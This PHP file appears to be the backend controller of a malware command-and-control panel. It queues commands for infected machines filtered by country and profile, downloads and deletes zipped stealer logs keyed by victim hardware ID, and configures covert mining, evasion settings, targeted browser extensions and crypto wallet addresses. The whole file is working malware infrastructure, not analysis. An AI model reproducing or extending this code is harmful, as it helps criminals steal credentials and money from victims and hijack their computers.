<?php
session_start();




include_once '../includes/db.php';

$get = $_GET;

if(isset($_POST['login']) && isset($_POST['password']))
{
  $stmt = $pdo->prepare("SELECT count(*) FROM config WHERE `login` = ? AND `password` = ?");
  $stmt->execute([$_POST['login'],$_POST['password']]);
  if($stmt->fetchColumn() > 0)
  {
    $_SESSION['logged']="true";
    header("Location: dashboard.php");
  }else {
    header("Location: index.php?a=1");
  }
  die();
}
if($_SESSION['logged']!="true")
{
  header("Location: index.php");
  die();
}

if (isset($get['cmd']) && isset($get['args']) && isset($get['count']) && isset($get['country']) && isset($get['profile'])) {
  $pdo->prepare("INSERT INTO `commands`(`type`, `args`, `count`, `country`, `profile`) VALUES (:cmd,:args,:count,:country,:profile)")->execute([
    ":cmd" => $get['cmd'],
    ":args" => $get['args'],
    ":count" => $get['count'],
    ":country" => $get['country'],
    ":profile" => $get['profile']
  ]);
  header("Location: tasks.php");
  die();
}
if (isset($get['del']) && isset($get['cmd'])) {
  $pdo->prepare("DELETE FROM commands WHERE `id` = ?")->execute([$get['cmd']]);
  header("Location: tasks.php");
  die();
}
if (isset($get['a']) && isset($get['h'])) {
  if ($get['a'] == 'dw') {
    header("Content-disposition: attachment; filename=".$get['h'].".zip");
    readfile("../uploads/".$get['h'].".zip");
  }
  if ($get['a']=='dl') {
    $pdo->prepare("DELETE FROM logs WHERE `hwid` = ?")->execute([$get['h']]);
    unlink("../uploads/".$get['h'].".zip");
    header('Location: stealer.php');
  }
  die();
}
if(isset($get['pass1']) && isset($get['pass2']))
{
  $pdo->prepare("UPDATE config SET `password` = ?")->execute([$get['pass1']]);
  header("Location: settings.php");
  die();
}
if(isset($get['start_delay']) && isset($get['startup_delay']) && isset($get['recover_interval']) && isset($get['reconnect_interval']))
{
  $pdo->prepare("UPDATE config SET `start_delay`= :std , `startup_delay` = :sd , `recover_interval` = :ri , `reconnect_interval` = :rei")->execute([
    ":std" => $get['start_delay'],
    ":sd" => $get['startup_delay'],
    ":ri" => $get['recover_interval'],
    ":rei" => $get['reconnect_interval']
  ]);
  header("Location: settings.php");
  die();
}
if(isset($get['mining_status']) && isset($get['warn_processes']) && isset($get['warn_windows']) && isset($get['exit_type']))
{
  $pdo->prepare("UPDATE config SET `mining_status`= :ms , `warn_processes` = :wp , `warn_windows` = :ww , `exit_type` = :et")->execute([
    ":ms" => $get['mining_status'],
    ":wp" => $get['warn_processes'],
    ":ww" => $get['warn_windows'],
    ":et" => $get['exit_type']
  ]);
  header("Location: settings.php");
  die();
}
if (isset($get['btc']) && isset($get['eth']) && isset($get['mon']) && isset($get['ltc']) && isset($get['ripple']) && isset($get['doge']) ) {
  $pdo->prepare("UPDATE wallets SET `wallet` = ? WHERE name = ?")->execute([$get['btc'],"Bitcoin"]);
  $pdo->prepare("UPDATE wallets SET `wallet` = ? WHERE name = ?")->execute([$get['eth'],"Ethereum"]);
  $pdo->prepare("UPDATE wallets SET `wallet` = ? WHERE name = ?")->execute([$get['mon'],"Monero"]);
  $pdo->prepare("UPDATE wallets SET `wallet` = ? WHERE name = ?")->execute([$get['ltc'],"Litecoin"]);
  $pdo->prepare("UPDATE wallets SET `wallet` = ? WHERE name = ?")->execute([$get['ripple'],"Ripple"]);
  $pdo->prepare("UPDATE wallets SET `wallet` = ? WHERE name = ?")->execute([$get['doge'],"Doge"]);
  header("Location: settings.php");
  die();
}
if(isset($get['extensions']))
{
  $pdo->prepare("UPDATE config SET `extensions` = ?")->execute([$get['extensions']]);
  header("Location: settings.php");
  die();
}


?>
